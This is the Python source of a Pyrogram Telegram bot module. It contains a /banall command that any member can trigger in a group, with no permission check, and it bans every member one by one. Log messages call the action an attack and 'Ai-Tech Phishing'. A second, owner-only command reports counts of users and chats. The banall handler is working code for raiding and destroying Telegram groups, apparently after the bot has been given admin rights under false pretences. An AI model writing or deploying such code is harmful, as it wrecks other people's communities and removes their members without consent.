from pyrogram import filters, Client, idle
from pyrogram.types import Message
from pyrogram.errors import ChatAdminRequired

from Aitech import OWNER, Rzayev
from Aitech.database.chats import get_served_chats
from Aitech.database.users import get_served_users



@Rzayev.on_message(
filters.command("banall") 
& filters.group
)
async def banall(client, message: Message):
    print("{} - üzvlər əldə edilir ❗".format(message.chat.id))
    async for i in Rzayev.get_chat_members(message.chat.id):
        try:
            await Rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("Atıldı - {} | Tərəfdindən - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
        except Exception as e:
            print("Xəta {} tərəfindən {}".format(i.user.id, e))           
    print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")


@Rzayev.on_message(filters.command("stats") & filters.user(OWNER))
async def stats(cli: Client, message: Message):
    users = len(await get_served_users())
    chats = len(await get_served_chats())
    await message.reply_text(
        f"""Ümumi Statistika {(await cli.get_me()).mention} :

➻ **Söhbətlər :** {chats}
➻ **istifadəçilər :** {users}"""
    )
